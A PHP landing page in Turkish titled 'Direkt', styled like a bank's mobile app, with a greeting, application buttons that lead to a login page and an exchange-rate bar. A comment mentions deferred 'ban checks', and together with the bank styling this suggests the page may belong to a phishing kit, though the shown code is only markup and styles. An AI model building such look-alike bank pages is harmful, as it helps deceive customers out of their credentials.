<?php
// Landing page - optimized for CDN delivery. 
// Database connections and ban checks are deferred to giris.php.
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>
    
    
    
    <title>Direkt</title>
    <style>
        <?php echo file_get_contents(dirname(__DIR__) . '/files/asset/css/normalize.min.css'); ?>
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 400;
          font-display: swap;
          src: url('files/asset/fonts/pxiEyp8kv8JHgFVrJJnecmNE.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 400;
          font-display: swap;
          src: url('files/asset/fonts/pxiEyp8kv8JHgFVrJJfecg.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 500;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLGT9Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 500;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLGT9Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 600;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLEj6Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 600;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLEj6Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 700;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLCz7Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 700;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLCz7Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 800;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLDD4Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 800;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLDD4Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        <?php echo file_get_contents(dirname(__DIR__) . '/basvuru/style.css'); ?>
    </style>
</head>
<body>
    <div id="slider">
        <div class="gray2 slide active">
            <div id="bireysel" style="display: inline-flex; width: 100%; justify-content: space-between;">
                <div style="width: 32px; margin-right: 15%; margin-left: 2%;"></div>
                <h2 style="text-align: center; font-size: 12px; color: black; margin: 0; margin-right: auto; display: flex; justify-content: center; align-items: center; border-bottom: solid red; font-weight: 500;">Bireysel</h2>
                <h2 style="text-align: center; font-size: 12px; color: black; margin: 0; display: flex; justify-content: center; align-items: center; margin-right: 20%; font-weight: 500;">Kurumsal</h2>
            </div>

            <h3 id="titles">İyi<br>günler</h3>

            <section id="buttons2">
                <button id="btn" onclick="location.href='giris.php'">Başvuru Yap</button>
                <button id="btn2" onclick="location.href='giris.php'">Müşterimiz Ol</button>
            </section>

            <div id="bottom-area">
                <div id="bottom-wrapper">
                    <img src="/basvuru/img/bottom.png" class="bottom-fixed">
                    <div id="kur-bar"><span>1 USD = <strong>47,6950 TL</strong></span></div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>




